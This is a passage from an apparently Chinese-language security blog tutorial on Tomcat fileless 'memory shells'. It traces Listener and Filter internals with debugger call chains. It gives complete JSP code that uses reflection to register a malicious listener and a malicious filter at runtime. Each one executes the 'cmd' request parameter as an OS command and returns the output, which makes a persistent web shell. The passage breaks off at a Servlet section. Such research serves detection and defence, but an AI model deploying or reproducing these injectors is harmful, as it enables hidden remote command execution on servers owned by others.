class=\"string\">&quot;requestInitialized&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>添加web.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;listener&gt;</span><br><span class=\"line\">     &lt;listener-class&gt;TestListener&lt;&#x2F;listener-class&gt;</span><br><span class=\"line\">&lt;&#x2F;listener&gt;</span><br></pre></td></tr></table></figure>\n\n<p>任意访问，发现确实是执行了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427232113842.png\" alt=\"image-20220427232113842\"></p>\n<h4 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h4><p>一个断点下到 requestInitialized，看下调用链</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">requestInitialized:12, TestListener</span><br><span class=\"line\">fireRequestInitEvent:5982, StandardContext (org.apache.catalina.core)</span><br><span class=\"line\">invoke:121, StandardHostValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:78, StandardEngineValve (org.apache.catalina.core)</span><br><span class=\"line\">service:364, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class=\"line\">service:624, Http11Processor (org.apache.coyote.http11)</span><br><span class=\"line\">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class=\"line\">process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class=\"line\">doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class=\"line\">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class=\"line\">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427233619096.png\" alt=\"image-20220427233619096\"></p>\n<p>在StandardContext#fireRequestInitEvent()中通过 调用本类中的 getApplicationEventListeners()获取到 listener，最后调用requestInitialized(event)，传入的event就是一些request的信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427234213687.png\" alt=\"image-20220427234213687\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427233716767.png\" alt=\"image-20220427233716767\"></p>\n<p>跟进 StandardContext#getApplicationEventListeners()，返回了 applicationEventListenersList</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427234453198.png\" alt=\"image-20220427234453198\"></p>\n<p>搜一下，不难发现 StandardContext#addApplicationEventListener() 添加了listener</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428001143412.png\" alt=\"image-20220428001143412\"></p>\n<p>那内存马实现方式就有思路了，通过反射调用 StandardContext#addApplicationEventListener() 添加我们编写的恶意listener</p>\n<h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>test.jsp</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyListener</span> <span class=\"keyword\">implements</span> <span class=\"title\">ServletRequestListener</span></span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestDestroyed</span><span class=\"params\">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class=\"line\">            HttpServletRequest req =(HttpServletRequest) sre.getServletRequest();</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>) != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">                InputStream in = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    in = Runtime.getRuntime().exec(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>,<span class=\"string\">&quot;/c&quot;</span>,req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class=\"line\">                    Scanner s = <span class=\"keyword\">new</span> Scanner(in).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>);</span><br><span class=\"line\">                    String out = s.hasNext()?s.next():<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">//反射获取 response</span></span><br><span class=\"line\">                    Field requestF = req.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">                    requestF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">                    Request request = (Request)requestF.get(req);</span><br><span class=\"line\">                    request.getResponse().getWriter().write(out);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123; &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123; &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123; &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestInitialized</span><span class=\"params\">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">    reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    Request req = (Request) reqF.get(request);</span><br><span class=\"line\">    StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class=\"line\">    MyListener myListener = <span class=\"keyword\">new</span> MyListener();</span><br><span class=\"line\">    stdcontext.addApplicationEventListener(myListener);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428111216794.png\" alt=\"image-20220428111216794\"></p>\n<h3 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h3><p>filter就是在请求到达servlet前进行一次预处理，访问资源完成后，再次返回到filter中，可以实现身份权限验证，日志记录</p>\n<h4 id=\"简单过滤器的实现\"><a href=\"#简单过滤器的实现\" class=\"headerlink\" title=\"简单过滤器的实现\"></a>简单过滤器的实现</h4><p>TestFilter</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]filter init&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//放行前，对 request处理</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;before filter&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//放行，调用下一个filter链</span></span><br><span class=\"line\">        chain.doFilter(request,response);</span><br><span class=\"line\">        <span class=\"comment\">//放行后，对response处理</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;after filter&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]filter destroy&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>添加web.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;filter&gt;</span><br><span class=\"line\">    &lt;filter-name&gt;TestFilter&lt;&#x2F;filter-name&gt;</span><br><span class=\"line\">    &lt;filter-class&gt;TestFilter&lt;&#x2F;filter-class&gt;</span><br><span class=\"line\">&lt;&#x2F;filter&gt;</span><br><span class=\"line\">&lt;filter-mapping&gt;</span><br><span class=\"line\">    &lt;filter-name&gt;TestFilter&lt;&#x2F;filter-name&gt;</span><br><span class=\"line\">    &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class=\"line\">&lt;&#x2F;filter-mapping&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428115408269.png\" alt=\"image-20220428115408269\"></p>\n<h4 id=\"流程分析-1\"><a href=\"#流程分析-1\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h4><p>一个断点下到 <strong>chain.doFilter(request,response);</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">doFilter:13, TestFilter</span><br><span class=\"line\">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class=\"line\">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class=\"line\">invoke:196, StandardWrapperValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:97, StandardContextValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class=\"line\">invoke:135, StandardHostValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:78, StandardEngineValve (org.apache.catalina.core)</span><br><span class=\"line\">service:364, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class=\"line\">service:624, Http11Processor (org.apache.coyote.http11)</span><br><span class=\"line\">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class=\"line\">process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class=\"line\">doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class=\"line\">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class=\"line\">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428115638585.png\" alt=\"image-20220428115638585\"></p>\n<p>ApplicationFilterChain#internalDoFilter()，从当前的 filters数组中取出一个filterConfig类型的对象，然后调用getFilter()获取filter后调用doFilter()，也就是我们编写的doFilter方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428154710366.png\" alt=\"image-20220428154710366\"></p>\n<p>看一下filters是怎么定义的，通过 创建了 ApplicationFilterConfig 对象来定义的对象数组，这里的值是怎么改变的后面在说</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428155718027.png\" alt=\"image-20220428155718027\"></p>\n<p>向上 ApplicationFilterChain#doFilter() 调用了 internalDoFilter() </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428162936642.png\" alt=\"image-20220428162936642\"></p>\n<p>向上，在 StandardWrapperValve#invoke()中，filterChain中存放了两个 ApplicationFilterConfig 类型的filter，第一个就是自己创建的filter</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428163206210.png\" alt=\"image-20220428163206210\"></p>\n<p>跟一下 filterChain 的定义，在 StandardWrapperValve#invoke中通过 createFilterChain() 获得了一个 ApplicationFilterChain 的对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428152749125.png\" alt=\"image-20220428152749125\"></p>\n<p><strong>那么 createFilterChain() 需要重点关注，看看它是怎么把我们编写的TestFiler添加到ApplicationFilterConfig类型的filters变量中</strong>，跟进 ApplicationFilterFactory#createFilterChain，首先获取Request，然后通过getFilterChain()获取filterChain</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506152221020.png\" alt=\"image-20220506152221020\"></p>\n<p>往下通过 StandardContext 对象的findFilterMaps()获取filterMaps[]</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428170204636.png\" alt=\"image-20220428170204636\"></p>\n<p>通过遍历 filterMaps[]，找到 StandardContext 对象中的FilterConfig，然后通过filterChain.addFilter把FilterConfig加入了filterChain中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428170549419.png\" alt=\"image-20220428170549419\"></p>\n<p>跟进 ApplicationFilterChain#addFilter()，将传入的 filterConfig 添加到ApplicationFilterConfig中，这里就对应上面改变filters的值的地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428173308779.png\" alt=\"image-20220428173308779\"></p>\n<p>这里需要关注三个变量</p>\n<ol>\n<li><strong>filterConfigs：</strong>存放 <strong>filterDef（见 filterDefs） **，</strong>filter 实例对象**及其他信息</li>\n<li><strong>filterDefs：</strong>存放<strong>过滤器名、过滤器全限定名</strong>及其他信息</li>\n<li><strong>filterMaps</strong>：存放<strong>过滤器名字（</strong>FilterName <strong>）</strong>及<strong>对应作用 url（</strong>URLPattern<strong>）</strong></li>\n</ol>\n<p>存放在StandardContext对象context中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506155640818.png\" alt=\"image-20220506155640818\"></p>\n<p>联系到Filter型内存马，肯定需要找到能修改StandardContext对象中这三个变量的值的地方。既然三个变量从StandardContext中获得，我们去查看有什么方法进行修改</p>\n<p>1）filterMaps</p>\n<p>找到了两个方法 StandardContext#addFilterMap() 和 StandardContext#addFilterMapBefore()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506160629266.png\" alt=\"image-20220506160629266\"></p>\n<p>2）filterConfigs</p>\n<p>找到了StandardContext#filterStart()，根据查找的资料这个方法主要功能为：根据filterDefs初始化 filterConfigs，从代码可知先将filterDefs从HashMap类型转为集合类型，然后获取一个迭代器，通过while进行遍历，获取name，通过一个ApplicationFilterConfig类型的对象filterConfig，获得filter的实例，最后通过put，添加到filterConfigs</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506163749910.png\" alt=\"image-20220506163749910\"></p>\n<p>3）filterDefs</p>\n<p>从上面可以看出来，最原始的数据都是从filterDefs中获得的，搜索它的值从什么地方来找到了<strong>StandardContext#addFilterDef()</strong></p>\n<p>tomcat启动时，去解析web.xml时会调用这里所以我们去简单跟进一下web.xml的启动过程。</p>\n<p>ContextConfig#configureStart()调用ContextConfig#webConfig()，使用webxml解析器来解析web.xml然后存放到webxml变量中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506182316657.png\" alt=\"image-20220506182316657\"></p>\n<p>又调用ContextConfig#configureContext()获取web.xml中的filter，进行遍历然后调用StandardContext#addFilterDef()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506182131998.png\" alt=\"image-20220506182131998\"></p>\n<p>StandardContext#addFilterDef()，传入name 和 filterDef</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506175731942.png\" alt=\"image-20220506175731942\"></p>\n<h4 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>理解了过程，就可以通过控制filterMaps、filterConfigs、filterDefs的值，则可以注入恶意的filter</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;&lt;%--</span><br><span class=\"line\">  Created by IntelliJ IDEA.</span><br><span class=\"line\">  User: cys</span><br><span class=\"line\">  Date: <span class=\"number\">2022</span>/<span class=\"number\">5</span>/<span class=\"number\">6</span></span><br><span class=\"line\">  Time: <span class=\"number\">18</span>:<span class=\"number\">30</span></span><br><span class=\"line\">  To change <span class=\"keyword\">this</span> template use File | Settings | File Templates.</span><br><span class=\"line\">--%&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Filter&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"comment\">//获取context</span></span><br><span class=\"line\">    Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">    reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    Request req = (Request) reqF.get(request);</span><br><span class=\"line\">    StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//获取上下文的filterConfigs</span></span><br><span class=\"line\">    Field Configs = stdcontext.getClass().getDeclaredField(<span class=\"string\">&quot;filterConfigs&quot;</span>);</span><br><span class=\"line\">    Configs.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    Map filterConfigs = (Map) Configs.get(stdcontext);  <span class=\"comment\">//获取filterConfigs的所有字段，map类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//创建恶意的filter</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String name = <span class=\"string\">&quot;Y0ng&quot;</span>;  <span class=\"comment\">//filter的name</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(filterConfigs.get(name)==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        Filter filter = <span class=\"keyword\">new</span> Filter() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">                HttpServletRequest req = (HttpServletRequest) request;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">boolean</span> isLinux = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">                    String osTyp = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (osTyp != <span class=\"keyword\">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                        isLinux = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    String[] cmds = isLinux ? <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125; : <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125;;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class=\"line\">                    Scanner s = <span class=\"keyword\">new</span> Scanner( in ).useDelimiter(<span class=\"string\">&quot;\\\\a&quot;</span>);</span><br><span class=\"line\">                    String output = s.hasNext() ? s.next() : <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                    response.getWriter().write(output);</span><br><span class=\"line\">                    response.getWriter().flush();</span><br><span class=\"line\">                    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                chain.doFilter(request, response);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建对应的FilterDef</span></span><br><span class=\"line\">        FilterDef filterDef = <span class=\"keyword\">new</span> FilterDef();</span><br><span class=\"line\">        filterDef.setFilter(filter);</span><br><span class=\"line\">        filterDef.setFilterName(name);</span><br><span class=\"line\">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\">        <span class=\"comment\">//利用addFilterDef污染filterDefs</span></span><br><span class=\"line\">        stdcontext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建对应的FilterMap</span></span><br><span class=\"line\">        FilterMap filterMap = <span class=\"keyword\">new</span> FilterMap();</span><br><span class=\"line\">        filterMap.addURLPattern(<span class=\"string\">&quot;/Y0ng&quot;</span>);</span><br><span class=\"line\">        filterMap.setFilterName(name);</span><br><span class=\"line\">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\">        <span class=\"comment\">//将恶意filter放置第一位</span></span><br><span class=\"line\">        stdcontext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//调用反射方法，去创建filterConfig实例</span></span><br><span class=\"line\">        Constructor constructor = ApplicationFilterConfig.class.getConstructor(Context.class, FilterDef.class);</span><br><span class=\"line\">        constructor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(stdcontext, filterDef);</span><br><span class=\"line\">        filterConfigs.put(name,filterConfig);</span><br><span class=\"line\">        out.print(<span class=\"string\">&quot;Inject Success !&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506213023216.png\" alt=\"image-20220506213023216\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506213036061.png\" alt=\"image-20220506213036061\"></p>\n<h3 id=\"Servlet\"><a href=\"#Servlet\" class=\"headerlink\" title=\"Servlet\"></a>Servlet</h3><h4 id=\"简单的servlet的实现\"><a href=\"#简单的servlet的实现\" class=\"headerlink\" title=\"简单的servlet的实现\"></a>简单的servlet的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletException;</span><br><span 